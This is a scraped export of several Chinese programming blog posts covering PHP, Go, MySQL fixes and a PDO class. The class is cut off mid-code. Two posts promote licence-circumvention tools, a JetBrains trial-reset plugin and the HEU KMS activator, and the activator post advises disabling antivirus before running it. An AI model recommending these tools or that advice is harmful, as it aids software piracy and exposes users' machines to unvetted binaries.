\u0026#39;\u0026#39;, // \u0026#39;/\\.(png|jpe?g)$/i\u0026#39; / 解释：排除后缀png.jpeg.jpg \u0026#39;dirs_exclude\u0026#39; =\u0026gt; \u0026#39;\u0026#39;, // \u0026#39;/\\/AAA|\\/doc|\\/222(\\/|$)/i\u0026#39; / 解释：排除目录AAA.doc.222 // 菜单 \u0026#39;menu_enabled\u0026#39; =\u0026gt; true // 启用或禁用左侧文件夹菜单 \u0026#39;menu_show\u0026#39; =\u0026gt; true // 文件夹菜单展开或折叠 \u0026#39;menu_sort\u0026#39; =\u0026gt; \u0026#39;name_asc\u0026#39; // 左侧文件夹菜单排序 / name_asc，name_desc，date_asc，date_desc // 布局 \u0026#39;layout\u0026#39; =\u0026gt; \u0026#39;rows\u0026#39; // 主视图区域布局，包括选项 列表，块，网格，行和列 \u0026#39;sort\u0026#39; =\u0026gt; \u0026#39;name_asc\u0026#39; // 主视图区域默认排序 / name_asc，name_desc，date_asc，date_desc 使用插件（非必选）\n下载插件\n下载地址：https://cdn.jsdelivr.net/gh/qiantigers/files.photo.gallery@1.1/_files/plugins/tasks.php\n安置tasks.php\n将其放到_files/plugins/\n使用方法\n1. ?task= 放在链接后，举个例子：https://www.a.com/?task=\ncreate_cache / menu / folders / images / all / force / dir / ignore_max_depth / time_limit 缓存设置，比如缓存所有图片缩略图，举个例子：https://www.a.com/?task=create_cache\u0026images\n3. clear_cache / menu / folders / images / all / force / time_limit 清除缓存，比如删除图片缓存，举个例子：https://www.a.com/?task=clear_cache\u0026images 4. create_html 缓存html，举个例子：https://www.a.com/?task=create_html\n使用完插件把插件文件进行改名或者删除，需要时再使用，否则小心被人恶意乱搞哦~\n结语 这是一款简约而不简单，轻量而不轻薄的PHP应用\n","date":"2021-09-15T22:37:00Z","permalink":"https://blog.aaayun.cc/archives/745.html","title":"一个漂亮的单文件PHP目录程序"},{"content":"一、介绍 项目地址：https://gitee.com/pengzhile/ide-eval-resetter\n项目功能：JetBrains 所有产品都有 30 天试用，这个插件的作用就是重置这个试用时间，让你无限试用，也算是另类的 JetBrains 激活方式。\n支持的 JetBrains 产品，基本全系列都支持了：\nIntelliJ IDEA\nAppCode\nCLion\nDataGrip\nGoLand\nPhpStorm\nPyCharm\nRider\nRubyMine\nWebStorm\n二、使用方法 下载插件 下载地址： https://plugins.zhile.io/files/ide-eval-resetter-2.1.6.zip\n安装插件 直接下载插件 zip 包（macOS 可能会自动解压，然后把 zip 包丢进回收站）\n通常可以直接把 zip 包拖进 IDE 的窗口来进行插件的安装。如果无法拖动安装，你可以在Settings/Preferences… -\u0026gt; Plugins 里手动安装插件（Install Plugin From Disk…）\n插件会提示安装成功\n使用插件 成功安装插件后，在 帮助 下会多一个 Eval Reset 按钮，如下图所示：\njetbrains 试用\n一般来说，在 IDE 窗口切出去或切回来时（窗口失去/得到焦点）会触发事件，检测是否长时间（25 天）没有重置，给通知让你选择。（初次安装因为无法获取上次重置时间，会直接给予提示）\n也可以手动唤出插件的主界面：\n如果 IDE 没有打开项目，在Welcome界面点击菜单：Get Help -\u0026gt; Eval Reset\n如果 IDE 打开了项目，点击菜单：Help -\u0026gt; Eval Reset\n唤出的插件主界面中包含了一些显示信息，2 个按钮，1 个勾选项：\n按钮：Reload 用来刷新界面上的显示信息。\n按钮：Reset 点击会询问是否重置试用信息并重启 IDE。选择 Yes 则执行重置操作并重启 IDE 生效，选择 No 则什么也不做。（此为手动重置方式）\n勾选项：Auto reset before per restart 如果勾选了，则自勾选后每次重启/退出 IDE 时会自动重置试用信息，你无需做额外的事情。（此为自动重置方式）\n","date":"2021-09-15T01:15:00Z","permalink":"https://blog.aaayun.cc/archives/739.html","title":"IDE Eval Resetter：JetBrains 全家桶无限试用插件"},{"content":"mysql启动报错 Starting MySQL. ERROR! The server quit without updating PID file (/usr/local/mysql/var/i-3rq8ms16.pid)\n查看mysql状态\n1 sysyemctl status mysql 查看了网上许多文章都没有解决 (辣鸡cs*n)\n有一个解决方案没有试过 初始化数据库 (生产环境 杀了我吧 )\n错误日志 （lnmp） 1 cat /usr/local/mysql/var/i-3rq8ms16.err 出错原因 fs.file-max值设置过小。\n该值可以这样查看：\n1 cat /proc/sys/fs/file-max 发现结果是65536\n解决办法 修改/etc/sysctl.conf中的值fs.file-max，为修改成了6553600 执行sysctl -p 重启mysql 1 2 3 vim /etc/sysctl.conf sysctl -p systemctl restart mysql ","date":"2021-07-17T19:01:00Z","permalink":"https://blog.aaayun.cc/archives/734.html","title":"mysql启动报错The server quit without updating PID file"},{"content":"最近需要在 golang 中使用定时任务功能，用到了一个 cron 库，当前是 v3 版本，网上挺多都是 v2 的教程，记录一下使用方法。 在旧版本的库中默认的 cron 表达式不是标准格式，第一个位是秒级的定义。\n现在 v3 版本直接用标准 cron 表示式即可，主要看 godoc 文档部分\ncron 表示式 推荐使用在线工具来看自己写的 cron 对不对，简单的表达式直接写一般问题不大。这里推荐 crontab.guru，可以通过可视化的方式来查看你编写的定时规则。\n以下内容摘自 维基百科-Cron\n文件格式說明\n1 2 3 4 5 6 7 ┌──分鐘（0 - 59） │ ┌──小時（0 - 23） │ │ ┌──日（1 - 31） │ │ │ ┌─月（1 - 12） │ │ │ │ ┌─星期（0 - 6，表示从周日到周六） │ │ │ │ │ * * * * * 被執行的命令 注：\n在某些系统里，星期日也可以为 7\n不很直观的用法：如果日期和星期同时被设定，那么其中的一个条件被满足时，指令便会被执行。请参考下例。\n前 5 个域称之分时日月周，可方便个人记忆。\n从第六个域起，指明要执行的命令。\n安装 现在都是用的 Go module 进行模块的管理，直接在 goland 中使用 alt + 回车即可同步对应的包 “github.com/robfig/cron/v3”\n使用 go get 安装方式如下\n1 go get github.com/robfig/cron/v3 创建配置\n建议使用标准的 cron 表达式\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 // 使用默认的配置 c := cron.New() // 可以配置如果当前任务正在进行，那么跳过 c := cron.New(cron.WithChain(cron.SkipIfStillRunning(logger))) // 官方也提供了旧版本的秒级的定义，这个注意你需要传入的 cron 表达式不再是标准 cron 表达式 c := cron.New(cron.WithSeconds()) 在上面的代码中出现了一个 logger，我使用的是 logrus，在源码中可以看到 cron 需要的 logger 的定义 // Logger is the interface used in this package for logging, so that any backend // can be plugged in. It is a subset of the github.com/go-logr/logr interface. type Logger interface { // Info logs routine messages about cron\u0026#39;s operation. Info(msg string, keysAndValues ...interface{}) // Error logs an error condition. Error(err error, msg string, keysAndValues ...interface{}) } 那么我们定义了一个 Clog 结构体，实现对应的接口就行了 import ( \u0026#34;github.com/robfig/cron/v3\u0026#34; log \u0026#34;github.com/sirupsen/logrus\u0026#34; ) type CLog struct { clog *log.Logger } func (l *CLog) Info(msg string, keysAndValues ...interface{}) { l.clog.WithFields(log.Fields{ \u0026#34;data\u0026#34;: keysAndValues, }).Info(msg) } func (l *CLog) Error(err error, msg string, keysAndValues ...interface{}) { l.clog.WithFields(log.Fields{ \u0026#34;msg\u0026#34;: msg, \u0026#34;data\u0026#34;: keysAndValues, }).Warn(msg) } 添加任务 启动定时任务有两种方法，分别是传入函数和传入任务。 传入函数 我们看到文档中给出的范例，可以看到任务的添加是通过 c.AddFunc() 这个函数来进行的，直接传入一个函数即可，可以看到定义是 func (c *Cron) AddFunc(spec string, cmd func()) (EntryID, error)。 # Runs at 6am in time.Local cron.New().AddFunc(\u0026#34;0 6 * * ?\u0026#34;, ...) # Runs at 6am in America/New_York nyc, _ := time.LoadLocation(\u0026#34;America/New_York\u0026#34;) c := cron.New(cron.WithLocation(nyc)) c.AddFunc(\u0026#34;0 6 * * ?\u0026#34;, ...) // AddFunc adds a func to the Cron to be run on the given schedule. // The spec is parsed using the time zone of this Cron instance as the default. // An opaque ID is returned that can be used to later remove it. func (c *Cron) AddFunc(spec string, cmd func()) (EntryID, error) { return c.AddJob(spec, FuncJob(cmd)) } 举个例子，如果你传入的任务仅仅就是一个简单函数进行执行，使用 AddFunc() 就行了，同时也可以通过闭包来引用函数外面的变量，下面是一个完整的例子。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 package main import ( \u0026#34;fmt\u0026#34; \u0026#34;github.com/robfig/cron/v3\u0026#34; \u0026#34;time\u0026#34; ) func TestCron() { c := cron.New() i := 1 c.AddFunc(\u0026#34;*/1 * * * *\u0026#34;, func() { fmt.Println(\u0026#34;每分钟执行一次\u0026#34;, i) i++ }) c.Start() time.Sleep(time.Minute * 5) } func main() { TestCron() } /* output 每分钟执行一次 1 每分钟执行一次 2 每分钟执行一次 3 每分钟执行一次 4 每分钟执行一次 5 */ 传入任务 但是如果我们定义的任务里面还需要留存其他信息呢，可以使用 AddJob() 这个函数，追溯一下源码定义。 // AddJob adds a Job to the Cron to be run on the given schedule. // The spec is parsed using the time zone of this Cron instance as the default. // An opaque ID is returned that can be used to later remove it. func (c *Cron) AddJob(spec string, cmd Job) (EntryID, error) { schedule, err := c.parser.Parse(spec) if err != nil { return 0, err } return c.Schedule(schedule, cmd), nil } // 可以看到需要传入两个参数，`spec` 就是 cron 表达式，Job 类型我们好像还没见过，点进去看 // Job is an interface for submitted cron jobs. type Job interface { Run() } 现在知道我们的定时任务只需要实现 Run() 这个函数就行了，所以我们可以给出自己的 Job 定义 type Job struct { A int `json:\u0026#34;a\u0026#34;` B int `json:\u0026#34;b\u0026#34;` C string `json:\u0026#34;c\u0026#34;` Shut chan int `json:\u0026#34;shut\u0026#34;` } // implement Run() interface to start rsync job func (this Job) Run() { this.A++ fmt.Printf(\u0026#34;A: %d\\n\u0026#34;, this.A) *this.B++ fmt.Printf(\u0026#34;B: %d\\n\u0026#34;, *this.B) *this.C += \u0026#34;str\u0026#34; fmt.Printf(\u0026#34;C: %s\\n\u0026#34;, *this.C) } 代码例子 给出一个完整代码的示例，我封装了一个 StartJob 函数，方便自己的管理，当然在 c.AddJob() 处可添加多个任务，都会 cron 的要求执行\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 package main import ( \u0026#34;fmt\u0026#34; \u0026#34;github.com/robfig/cron/v3\u0026#34; log \u0026#34;github.com/sirupsen/logrus\u0026#34; \u0026#34;time\u0026#34; ) // 定时任务计划 /* - spec，传入 cron 时间设置 - job，对应执行的任务 */ func StartJob(spec string, job Job) { logger := \u0026amp;CLog{clog: log.New()} logger.clog.SetFormatter(\u0026amp;log.TextFormatter{ FullTimestamp: true, TimestampFormat: \u0026#34;2006-01-02 15:04:05\u0026#34;, }) c := cron.New(cron.WithChain(cron.SkipIfStillRunning(logger))) c.AddJob(spec, \u0026amp;job) // 启动执行任务 c.Start() // 退出时关闭计划任务 defer c.Stop() // 如果使用 select{} 那么就一直会循环 select { case \u0026lt;-job.Shut: return } } func StopJob(shut chan int) { shut \u0026lt;- 0 } type CLog struct { clog *log.Logger } func (l *CLog) Info(msg string, keysAndValues ...interface{}) { l.clog.WithFields(log.Fields{ \u0026#34;data\u0026#34;: keysAndValues, }).Info(msg) } func (l *CLog) Error(err error, msg string, keysAndValues ...interface{}) { l.clog.WithFields(log.Fields{ \u0026#34;msg\u0026#34;: msg, \u0026#34;data\u0026#34;: keysAndValues, }).Warn(msg) } type Job struct { A int `json:\u0026#34;a\u0026#34;` B int `json:\u0026#34;b\u0026#34;` C string `json:\u0026#34;c\u0026#34;` Shut chan int `json:\u0026#34;shut\u0026#34;` } // implement Run() interface to start job func (j *Job) Run() { j.A++ fmt.Printf(\u0026#34;A: %d\\n\u0026#34;, j.A) j.B++ fmt.Printf(\u0026#34;B: %d\\n\u0026#34;, j.B) j.C += \u0026#34;str\u0026#34; fmt.Printf(\u0026#34;C: %s\\n\u0026#34;, j.C) } func main() { job1 := Job{ A: 0, B: 1, C: \u0026#34;\u0026#34;, Shut: make(chan int, 1), } // 每分钟执行一次 go StartJob(\u0026#34;*/1 * * * *\u0026#34;, job1) time.Sleep(time.Minute * 3) } /* output A: 1 B: 2 C: str A: 2 B: 3 C: strstr A: 3 B: 4 C: strstrstr */ 总结 这个 cron 库的 v3 版本直接使用标准 cron 表达式即可\n启动 cron 任务有传入函数和传入任务两种方法，如果需要管理建议实现自己的 Job 类\n参考资料\nrobfig/cron\ngodoc-cron\ncrontab.guru\n","date":"2021-07-10T01:42:00Z","permalink":"https://blog.aaayun.cc/archives/709.html","title":"golang cron v3 定时任务实现"},{"content":"如今，市面上有很多不同的激活工具，包括kms激活工具和win10数字权利激活两种。kms激活工具通用性强，但需要180天循环激活。数字权利激活属于永久激活，但只支持win10系统。两者可以说，各有优缺点。\n系统迷之前分享过一款功能比较全面的激活工具，具体详见《KMS Tools v2020 kms激活工具 win10激活工具下载》。它几乎支持所有版本的Windows和Office激活，有需要的朋友，可以下载试试。\n这次，我们再给大家补充一款kms激活工具，软件名叫HEU KMS Activator。很多年前，该工具在网上非常火，可惜后来作者停止更新维护，也就不能用了。让人没想到的是，如今它竟然又复活，推出了全新的版本。\n（HEU KMS Activator）\nHEU KMS Activator是网友知彼而知己制作的一款kms激活工具。它可以激活win10、office2019、office2016等版本的应用。由于kms激活的有效期只有180天，所以它支持创建自动续期任务。\n另外，软件集成了将Office零售版转换成VOL版的功能，方便下错版本的朋友用kms进行激活。激活完成后，你可以在工具内查看Windows和Office的激活状态，非常方便。\nHEU KMS Activator原生免费无广告，没有任何捆绑的内容，绝对纯净安全。它在所有激活工具中，算是比较小巧好用的了，强烈推荐大家试试。需要注意的是，使用前必须先关闭杀毒软件，防止激活失败。\n更新：v20以上版本重新设计了UI界面，优化了KMS服务器。\n下载：HEU KMS Activator v23.1.0.zip\n","date":"2021-07-03T20:02:00Z","permalink":"https://blog.aaayun.cc/archives/705.html","title":"HEU KMS Activator v23.1.0 win10 office2019激活工具"},{"content":"参考：\nhttps://blog.csdn.net/qq_35921925/article/details/108110519\nhttp://www.piaoyi.org/php/php-java-bridge-jar-class.html\n一、centos下 PHP 调用 jar包\n1.准备工作\n1.1、php环境【php7.2】，并且将php.ini中的allow_url_include改为On\n1.2、安装java环境\n1 yum install java 2.下载 JavaBridge.jar(快捷下载)\nJavaBridge.jar和Java.inc\n下载地址: http://php-java-bridge.sourceforge.net/pjb/download.php\n打一个jar包，将打包好的jar包以及JavaBridge.jar放到ext目录里面 1 2 3 cp Hello.jar /usr/lib/jvm/java-1.8.0-openjdk-1.8.0.292.b10-1.el7_9.x86_64/jre/lib/ext cp JavaBridge.jar /usr/lib/jvm/java-1.8.0-openjdk-1.8.0.292.b10-1.el7_9.x86_64/jre/lib/ext cd /usr/lib/jvm/java-1.8.0-openjdk-1.8.0.292.b10-1.el7_9.x86_64/jre/lib/ext 启动JavaBridge.jar 1 java -jar JavaBridge.jar SERVLET:8080 3 JavaBridge.log 新建一个php站点，把Java.inc放到根目录，新建index.php，index.php内容如下 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 \u0026lt;?php header( \u0026#39;Content-Type: text/html; charset=UTF-8\u0026#39; ); define(\u0026#34;JAVA_DEBUG\u0026#34;, true); //调试设置 define(\u0026#34;JAVA_HOSTS\u0026#34;, \u0026#34;127.0.0.1:8080\u0026#34;); //设置javabridge监听端口 /*0: Log nothing, not even fatal errors. 1: Log fatal system errors such as \u0026#34;out of memory error\u0026#34;. 2: Log java exceptions.*/ define(\u0026#34;JAVA_LOG_LEVEL\u0026#34;, 2); //java.log_level: 0-6 require_once \u0026#34;Java.inc\u0026#34;; //php调用java的接口，与该脚本位于同一目录 java_set_file_encoding(\u0026#34;UTF-8\u0026#34;); //设置JAVA编码。 $ob = new Java(\u0026#34;Hello\u0026#34;); //实例 try{ $res = $ob-\u0026gt;h(\u0026#39;1333\u0026#39;); echo $res; } catch(Exception $e) { var_dump($e); } // 输出 1333 【一些注意事项】：\n关于PHP-Java-Bridge的各种函数使用：\n1、高版本的java_require不再使用,也无法使用,由于放到java虚拟机下面,则不需要再手动引入包文件。\n2、java_value()用于获取值,而且必须使用该函数获取值。\n(特别注意：如果该值需要存入数据库，那么必须使用该java_value函数,不然会报错，或者无法存入数据库)\n3、java_inspect()对实例化或者方法进行print_r类似的输出。\n(注：请不要直接使用var_dump这样的输出方法输出java的类、方法、变量，需要使用java_inspect或者java_value，例如：var_dump(java_inspect($abc)))\n4、实例化使用 $test = new Java(“Test\u0026quot;)的方式,如果实例化的方法中存在参数,可以这样new Java(“Test\u0026quot;,\u0026ldquo;pram\u0026rdquo;)\n提醒：\n1、务必确保对java.inc的引用，确保引用正确\n2、务必确保对jar包放在能引用的地方，比如java虚拟机jre下面\n3、在PHP中调用Java使用PHP的的写法即可\n","date":"2021-06-21T18:27:00Z","permalink":"https://blog.aaayun.cc/archives/691.html","title":"php调用java类"},{"content":"试着学习一下go的gin框架，相比php来说，坑太多了\n在模板里面如果 不定义define 则相同文件名会被 覆盖 ，必须定义\n项目结构：\nlayout/header.html文件\n(1)任何文件要以{{define “layout/header\u0026quot;}} 开始，最后{{end}}结束\n(2)公共头部 define\n1 2 3 {{define \u0026#34;layout/header\u0026#34;}} header {{end}} admin/index.html\n（1）文件要以{{define “admin/index.html\u0026quot;}} 开始，最后{{end}}结束，这里的index可以加文件后缀，index.html\n（2）需要通过{{template “layout/header\u0026quot; .}} 最后面有个【点】，它的意思是要把当前页面的变量传递到head.html中\n1 2 3 4 {{define \u0026#34;admin/index.html\u0026#34;}} {{template \u0026#34;layout/header\u0026#34; .}} admin {{end}} 输出模板代码\n1 c.HTML(http.StatusOK, \u0026#34;admin/index.html\u0026#34;, gin.H{}) 模板渲染设置\n1 r.LoadHTMLGlob(\u0026#34;views/**/*\u0026#34;) ","date":"2021-06-18T10:04:00Z","permalink":"https://blog.aaayun.cc/archives/674.html","title":"gin渲染多层目录下模板"},{"content":"golang实现windows下切换代理 实现很简单 主要修改注册表文件 利用walk展示页面\n界面如下 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 package main import ( \u0026#34;github.com/lxn/walk\u0026#34; . \u0026#34;github.com/lxn/walk/declarative\u0026#34; \u0026#34;github.com/lxn/win\u0026#34; \u0026#34;golang.org/x/sys/windows/registry\u0026#34; \u0026#34;log\u0026#34; ) func main() { var mw *walk.MainWindow var inTE *walk.TextEdit if err := (MainWindow{ AssignTo: \u0026amp;mw, //Icon: \u0026#34;img/logo.ico\u0026#34;, Title: \u0026#34;代理\u0026#34;, Size: Size{300, 200}, Layout: VBox{}, Children: []Widget{ HSplitter{ Children: []Widget{ TextEdit{AssignTo: \u0026amp;inTE, ReadOnly: true}, }, }, PushButton{ Text: \u0026#34;连接\u0026#34;, OnClicked: func() { status, ip := start() if status { inTE.SetText(\u0026#34;连接成功\\n当前IP\u0026#34; + ip) } else { inTE.SetText(\u0026#34;连接失败\u0026#34;) } }, }, PushButton{ Text: \u0026#34;关闭\u0026#34;, OnClicked: func() { status := editReg(\u0026#34;0\u0026#34;, \u0026#34;\u0026#34;) if status { inTE.SetText(\u0026#34;连接已关闭\u0026#34;) } else { inTE.SetText(\u0026#34;关闭失败\u0026#34;) } }, }, }, }.Create()); err != nil { log.Fatal(err) } win.SetWindowLong(mw.Handle(), win.GWL_STYLE, win.GetWindowLong(mw.Handle(), win.GWL_STYLE) \u0026amp; ^win.WS_MAXIMIZEBOX \u0026amp; ^win.WS_THICKFRAME) mw.Run() } func start() (bool, string) { ip, port := getIp() status := editReg(\u0026#34;1\u0026#34;, ip+\u0026#34;:\u0026#34;+port) return status, ip } // 获取ip func getIp() (string, string) { // 自行获取ip return \u0026#34;183.88.226.50\u0026#34;, \u0026#34;8080\u0026#34; } func editReg(enable, proxy string) bool { key, exists, err := registry.CreateKey(registry.CURRENT_USER, \u0026#34;SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Internet Settings\u0026#34;, registry.ALL_ACCESS) if err != nil { log.Fatal(err) } defer key.Close() if !exists { return false } err = key.SetStringValue(\u0026#34;ProxyEnable\u0026#34;, enable) if err != nil { return false } err = key.SetStringValue(\u0026#34;ProxyServer\u0026#34;, proxy) if err != nil { return false } return true } ","date":"2021-05-11T23:42:00Z","permalink":"https://blog.aaayun.cc/archives/657.html","title":"golang实现windows下切换代理"},{"content":"分享自己封装的mysql类 基于pdo 由于经常开发小型系统用不到框架，用原生写又太麻烦干脆封装一个MySQL操作类\n用了连贯操作 用法和tp相似 上手快 Db.zip\n用法 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 $res = Db::table(\u0026#39;tbl_user\u0026#39;)-\u0026gt;where(\u0026#39;id\u0026#39;, 1)-\u0026gt;find(); // 获取单个数据 $res = Db::table(\u0026#39;tbl_user\u0026#39;)-\u0026gt;order(\u0026#39;id\u0026#39;, \u0026#39;desc\u0026#39;)-\u0026gt;select(); // 获取结果集 排序 $res = Db::instance()-\u0026gt;getLastSql(); // 获取上次执行的sql $res = Db::table(\u0026#34;tbl_user\u0026#34;)-\u0026gt;where(\u0026#39;id\u0026#39;, 2)-\u0026gt;update([\u0026#39;name\u0026#39; =\u0026gt; \u0026#39;云青\u0026#39;]); // 更新数据 $res = Db::table(\u0026#34;tbl_user\u0026#34;)-\u0026gt;insert([\u0026#39;account\u0026#39; =\u0026gt; \u0026#39;acc\u0026#39;, \u0026#39;name\u0026#39; =\u0026gt; 123]); // 插入单个数据 并返回插入id $res = Db::table(\u0026#34;tbl_user\u0026#34;) -\u0026gt;insertAll( [ [\u0026#39;account\u0026#39; =\u0026gt; \u0026#39;test1\u0026#39;, \u0026#39;name\u0026#39; =\u0026gt; \u0026#39;test1\u0026#39;], [\u0026#39;account\u0026#39; =\u0026gt; \u0026#39;test2\u0026#39;, \u0026#39;name\u0026#39; =\u0026gt; \u0026#39;test2\u0026#39;] ] ); // 批量插入数据 $res = Db::table(\u0026#39;tbl_user\u0026#39;)-\u0026gt;where(\u0026#39;id\u0026#39;, 5)-\u0026gt;delete(); // 删除数据 $res = Db::table(\u0026#39;tbl_user\u0026#39;)-\u0026gt;tbFields(); // 获取数据表字段 $res = Db::table(\u0026#39;tbl_user\u0026#39;)-\u0026gt;count(\u0026#39;id\u0026#39;); // 统计数据条数 $res = Db::table(\u0026#39;tbl_user\u0026#39;)-\u0026gt;field(\u0026#39;id\u0026#39;)-\u0026gt;sum(); // 统计id和 $res = Db::table(\u0026#39;tbl_user\u0026#39;)-\u0026gt;doSql(\u0026#34;select * from tbl_user\u0026#34;); // 自定义sql $res = Db::instance()-\u0026gt;startTrans(); // 开启事务 $res = Db::table(\u0026#34;tbl_user\u0026#34;) -\u0026gt;insertAll( [ [\u0026#39;account\u0026#39; =\u0026gt; \u0026#39;test1\u0026#39;, \u0026#39;name\u0026#39; =\u0026gt; \u0026#39;test1\u0026#39;], [\u0026#39;account\u0026#39; =\u0026gt; \u0026#39;test2\u0026#39;, \u0026#39;test2\u0026#39; =\u0026gt; \u0026#39;test2\u0026#39;] ] ); // 批量插入数据 $res = Db::instance()-\u0026gt;commit(); // 提交 $res = Db::instance()-\u0026gt;rollback(); // 回滚 $res = Db::table(\u0026#39;tbl_user\u0026#39;) -\u0026gt;field(\u0026#39;id\u0026#39;) -\u0026gt;whereIn(\u0026#39;account\u0026#39;, \u0026#39;test1,test2\u0026#39;) -\u0026gt;where(\u0026#39;id\u0026#39;, \u0026#39;!=\u0026#39;, 2) -\u0026gt;select(); // whereIn $res = Db::table(\u0026#39;tbl_user\u0026#39;) // whereIn -\u0026gt;field(\u0026#39;id\u0026#39;) -\u0026gt;whereIn(\u0026#39;account\u0026#39;, \u0026#39;test1,test2\u0026#39;) -\u0026gt;whereIn(\u0026#39;name\u0026#39;, [\u0026#39;test1\u0026#39;, \u0026#39;test2\u0026#39;], \u0026#39;or\u0026#39;) -\u0026gt;where(\u0026#39;pmid\u0026#39;, \u0026#39;=\u0026#39;, 0) -\u0026gt;select(); 封装类 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 200 201 202 203 204 205 206 207 208 209 210 211 212 213 214 215 216 217 218 219 220 221 222 223 224 225 226 227 228 229 230 231 232 233 234 235 236 237 238 239 240 241 242 243 244 245 246 247 248 249 250 251 252 253 254 255 256 257 258 259 260 261 262 263 264 265 266 267 268 269 270 271 272 273 274 275 276 277 278 279 280 281 282 283 284 285 286 287 288 289 290 291 292 293 294 295 296 297 298 299 300 301 302 303 304 305 306 307 308 309 310 311 312 313 314 315 316 317 318 319 320 321 322 323 324 325 326 327 328 329 330 331 332 333 334 335 336 337 338 339 340 341 342 343 344 345 346 347 348 349 350 351 352 353 354 355 356 357 358 359 360 361 362 363 364 365 366 367 368 369 370 371 372 373 374 375 376 377 378 379 380 381 382 383 384 385 386 387 388 389 390 391 392 393 394 395 396 397 398 399 400 401 402 403 404 405 406 407 408 409 410 411 412 413 414 415 416 417 418 419 420 421 422 423 424 425 426 427 428 429 430 431 432 433 434 435 436 437 438 439 440 441 442 443 444 445 446 447 448 449 450 451 452 453 454 455 456 457 458 459 460 461 462 463 464 465 466 467 468 469 470 471 472 473 474 475 476 477 478 479 480 481 482 483 484 485 486 487 488 489 490 491 492 493 494 495 496 497 498 499 500 501 502 503 504 505 506 507 508 509 510 511 512 513 514 515 516 517 518 519 520 521 522 523 524 525 526 527 528 529 530 531 532 533 534 535 536 537 538 539 540 541 542 543 544 545 546 547 548 549 550 551 552 553 554 555 556 557 558 559 560 561 562 563 564 565 566 567 568 569 570 571 572 573 574 575 576 577 578 579 580 581 582 583 584 585 586 587 588 589 590 591 592 593 594 595 596 597 598 599 600 601 602 603 604 605 606 607 608 609 610 611 612 613 614 615 616 617 618 619 620 621 622 623 624 625 626 627 628 629 630 631 632 633 634 635 636 637 638 639 640 641 642 643 644 645 646 647 648 649 650 651 652 653 654 655 656 657 658 659 660 661 662 663 664 665 666 667 668 669 670 671 672 673 674 675 676 677 678 679 680 681 682 683 684 685 686 687 688 689 690 691 692 693 694 695 696 697 698 699 700 701 702 703 704 705 706 707 708 709 710 711 712 713 714 715 716 717 718 719 720 721 722 723 724 725 726 727 728 729 730 731 732 733 734 735 736 737 738 739 740 741 742 743 744 745 746 747 748 749 750 751 752 753 754 755 756 757 758 759 760 761 762 763 764 765 766 767 768 769 770 771 772 773 774 775 776 777 778 779 780 781 782 783 784 785 786 787 788 789 790 791 792 793 794 795 796 797 798 799 800 801 802 803 804 805 806 807 808 809 810 811 812 813 814 815 816 817 818 819 820 821 822 823 824 825 826 827 828 829 830 831 832 833 \u0026lt;?php /** * @author anderyly * @email admin@aaayun.cc * @link http://vclove.cn/ * @copyright Copyright (c) 2018 */ namespace ay\\lib; class Db { private static $db; private $dbType = \u0026#39;mysql\u0026#39;; private $pConnect = true; private static $table; private $host; private $port; private $dbName; private $user; private $pass; private $group = \u0026#39;\u0026#39;; private static $sql = false; //最后一条sql语句 private $where = \u0026#39;\u0026#39;; private $order = \u0026#39;\u0026#39;; private $limit = \u0026#39;\u0026#39;; private $field = \u0026#39;*\u0026#39;; private $clear = 0; //状态，0表示查询条件干净，1表示查询条件污染 private static $trans = 0; //事务指令数 /** * 初始化 * Dc constructor. * @param null $conf 数据库配置 */ public function __construct($conf = null) { class_exists(\u0026#39;PDO\u0026#39;) or halt(\u0026#34;PDO模块不存在\u0026#34;); if (is_null($conf)) { $conf = C(); } $this-\u0026gt;dbType = $conf[\u0026#39;DB_TYPE\u0026#39;]; $this-\u0026gt;host = $conf[\u0026#39;DB_HOST\u0026#39;]; $this-\u0026gt;port = $conf[\u0026#39;DB_PORT\u0026#39;]; $this-\u0026gt;user = $conf[\u0026#39;DB_USER\u0026#39;]; $this-\u0026gt;pass = $conf[\u0026#39;DB_PASS\u0026#39;]; $this-\u0026gt;dbName = $conf[\u0026#39;DB_NAME\u0026#39;]; //连接数据库 if (is_null(self::$db)) { $this-\u0026gt;connect(); } } /** * PDO连接数据库 * @throws \\Exception */ private function connect() { $dsn = $this-\u0026gt;dbType . \u0026#39;:host=\u0026#39; . $this-\u0026gt;host . \u0026#39;;port=\u0026#39; . $this-\u0026gt;port . 